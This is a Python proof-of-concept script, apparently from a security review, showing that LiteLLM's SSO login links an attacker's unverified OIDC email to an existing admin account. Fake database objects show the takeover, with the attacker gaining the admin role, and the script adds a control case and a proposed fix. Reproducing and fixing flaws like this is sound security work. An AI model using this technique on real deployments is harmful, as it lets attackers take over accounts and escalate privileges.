"""Scratch repro: SSO account linking matches an existing account by EMAIL without
requiring an IdP-verified email, then stamps the attacker's sso_user_id onto the
victim's row. Never commit this file.

Attack case: attacker completes SSO at the operator's generic OIDC tenant with an
UNVERIFIED email equal to an existing user's email. The lookup by ids misses, the
email fallback matches the victim's row, and the session key is minted with the
victim's user_id and role.

Run:  .venv-hunt/bin/python zz_sso_email_link_repro_test.py
"""

import asyncio
import os
import sys
from types import SimpleNamespace
from typing import Any

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from litellm.models.user import LiteLLM_UserTable  # noqa: E402
from litellm.proxy.common_utils.user_api_key_cache import UserApiKeyCache  # noqa: E402
from litellm.proxy.management_endpoints.ui_sso import (  # noqa: E402
    apply_user_info_values_to_sso_user_defined_values,
    get_user_info_from_db,
)

VICTIM_ROW = {
    "user_id": "u-admin",
    "user_email": "admin@corp.com",
    "sso_user_id": "old-idp-sub",
    "user_role": "proxy_admin",
    "user_alias": None,
    "models": [],
}

ATTACKER_SUB = "attacker-unverified-sub"
VICTIM_EMAIL = "admin@corp.com"


class FakeUserTable:
    """Stands in for prisma's LiteLLM_UserTable actions: records every write."""

    def __init__(self, rows: list[dict[str, Any]]) -> None:
        self.rows = rows
        self.writes: list[tuple[Any, Any]] = []
        self.created: list[dict[str, Any]] = []

    def _model(self, row: dict[str, Any]):
        return LiteLLM_UserTable.model_validate({**row, "organization_memberships": []})

    async def find_unique(self, where, include=None):
        for row in self.rows:
            if row["user_id"] == where.get("user_id"):
                return self._model(row)
            if "sso_user_id" in where and row.get("sso_user_id") == where["sso_user_id"]:
                return self._model(row)
        return None

    async def find_first(self, where, include=None):
        spec = where.get("user_email") or {}
        equals = (spec.get("equals") or "").lower()
        for row in self.rows:
            if (row.get("user_email") or "").lower() == equals:
                return self._model(row)
        return None

    async def update(self, where, data):
        self.writes.append((where, dict(data)))
        return None

    async def update_many(self, where, data):
        self.writes.append((where, dict(data)))
        return len(self.rows)

    async def create(self, data):
        self.created.append(dict(data))
        return self._model(data)


class FakeDB:
    def __init__(self, table: FakeUserTable) -> None:
        self.litellm_usertable = table


class FakePrisma:
    def __init__(self, table: FakeUserTable) -> None:
        self.db = FakeDB(table)

    @property
    def writer_db(self) -> FakeDB:
        return self.db


def sso_result(email: str, provider_id: str) -> SimpleNamespace:
    """What fastapi-sso hands the callback for a generic OIDC login."""
    return SimpleNamespace(
        id=provider_id,
        email=email,
        display_name=None,
        first_name=None,
        last_name=None,
        user_role=None,
        team_ids=[],
        team_id_to_upsert=None,
    )


def sso_user_defined_values(user_id: str, email: str) -> dict:
    return {
        "models": [],
        "user_id": user_id,
        "user_email": email,
        "max_budget": None,
        "user_role": None,
        "budget_duration": None,
    }


async def run_login(table: FakeUserTable, email: str, provider_id: str) -> dict:
    prisma = FakePrisma(table)
    cache = UserApiKeyCache()
    user_defined_values = sso_user_defined_values(provider_id, email)
    user_info = await get_user_info_from_db(
        result=sso_result(email, provider_id),
        prisma_client=prisma,
        user_api_key_cache=cache,
        proxy_logging_obj=SimpleNamespace(),
        user_email=None,
        user_defined_values=user_defined_values,
        alternate_user_id=provider_id,
    )
    await asyncio.sleep(0.05)  # let the asyncio.create_task stamping land
    applied = apply_user_info_values_to_sso_user_defined_values(
        user_info=user_info, user_defined_values=user_defined_values
    )
    return {"user_info": user_info, "applied": applied}


def main() -> int:
    print("== ATTACK: SSO login with an unverified email equal to an existing user's email")
    table = FakeUserTable([dict(VICTIM_ROW)])
    out = asyncio.run(run_login(table, VICTIM_EMAIL, ATTACKER_SUB))
    user_info = out["user_info"]
    applied = out["applied"]
    matched_victim = user_info is not None and getattr(user_info, "user_id", None) == "u-admin"
    stamped = any(
        (where or {}).get("user_id") == "u-admin" and data.get("sso_user_id") == ATTACKER_SUB
        for where, data in table.writes
    )
    acts_as_victim = applied is not None and applied.get("user_id") == "u-admin"
    role_inherited = applied is not None and applied.get("user_role") == "proxy_admin"
    print(f"matched victim row:      {matched_victim}")
    print(f"stamped attacker sso id: {stamped}")
    print(f"session key minted as:   {applied.get('user_id') if applied else None}")
    print(f"inherited role:          {applied.get('user_role') if applied else None}")
    attack_works = matched_victim and stamped and acts_as_victim and role_inherited
    print(f"ATTACK RESULT: {'SUCCEEDED' if attack_works else 'failed'}")

    print()
    print("== CONTROL A: same login, no row matches that email (real fuzzy lookup only)")
    from litellm.proxy.auth.auth_checks import _get_fuzzy_user_object

    empty = FakeUserTable([])

    async def control_a() -> object | None:
        return await _get_fuzzy_user_object(FakePrisma(empty), sso_user_id=ATTACKER_SUB, user_email=VICTIM_EMAIL)

    matched_empty = asyncio.run(control_a())
    print(f"fuzzy lookup returned: {matched_empty!r}")
    control_a_ok = matched_empty is None

    print()
    print("== CONTROL B: the one-line fix (require IdP-verified email before email fallback)")
    import litellm.proxy.auth.auth_checks as auth_checks

    async def gated_fuzzy(prisma_client, sso_user_id=None, user_email=None):
        """The real function plus the gate the MCP identity binding already enforces."""
        if sso_user_id is not None:
            response = await prisma_client.db.litellm_usertable.find_unique(where={"sso_user_id": sso_user_id})
            if response is not None:
                return response
        # unverified email: the fallback that links accounts must not run
        return None

    original = auth_checks._get_fuzzy_user_object
    auth_checks._get_fuzzy_user_object = gated_fuzzy  # type: ignore[assignment]
    try:
        table_b = FakeUserTable([dict(VICTIM_ROW)])
        matched_b = asyncio.run(gated_fuzzy(FakePrisma(table_b), sso_user_id=ATTACKER_SUB, user_email=VICTIM_EMAIL))
        fixed = matched_b is None or getattr(matched_b, "user_id", None) != "u-admin"
        print(f"with the gate, no victim row is returned: {fixed}")
    finally:
        auth_checks._get_fuzzy_user_object = original

    ok = attack_works and control_a_ok and fixed
    print()
    print(f"OVERALL: {'PASS - email fallback links accounts without email verification' if ok else 'FAIL'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
